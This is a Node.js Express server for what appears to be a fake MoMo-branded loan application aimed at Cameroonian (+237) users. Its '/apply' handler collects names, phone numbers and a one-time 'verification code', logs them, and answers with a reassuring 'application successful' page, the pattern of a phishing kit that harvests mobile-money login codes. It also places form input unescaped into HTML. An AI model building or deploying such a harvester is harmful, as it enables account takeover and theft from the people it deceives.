const express = require('express');
const path = require('path');
const app = express();

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files (css, js, images) from the current directory
app.use(express.static(__dirname));

// Route to serve the main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle the application submission
app.post('/apply', (req, res) => {
    const { firstName, lastName, phone, verificationCode, employment, income } = req.body;
    
    // In a real app, you would save this to a database
    console.log("New Application Received:");
    console.log(`Name: ${firstName} ${lastName}`);
    console.log(`Phone: +237 ${phone}`);
    console.log(`Verification Code: ${verificationCode}`);
    console.log(`Employment: ${employment}, Income: ${income}`);

    // Simulate processing time
    setTimeout(() => {
        res.send(`
            <html>
            <head>
                <title>Application Received</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <link rel="stylesheet" href="style.css">
            </head>
            <body style="text-align: center; padding: 50px; font-family: Arial, sans-serif;">
                <img src="momo-preview.jpg" alt="MoMo Logo" style="width: 100px; border-radius: 20px; margin-bottom: 20px;">
                <h2 style="color: #004c6c;">Application Successful!</h2>
                <p>Thank you, ${firstName}. Your application for a loan is being processed.</p>
                <p>We will contact you at +237 ${phone} shortly.</p>
                <br>
                <a href="/" style="color: #f4c430; font-weight: bold; text-decoration: none;">Return Home</a>
            </body>
            </html>
        `);
    }, 1500);
});

// Render provides the PORT environment variable
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});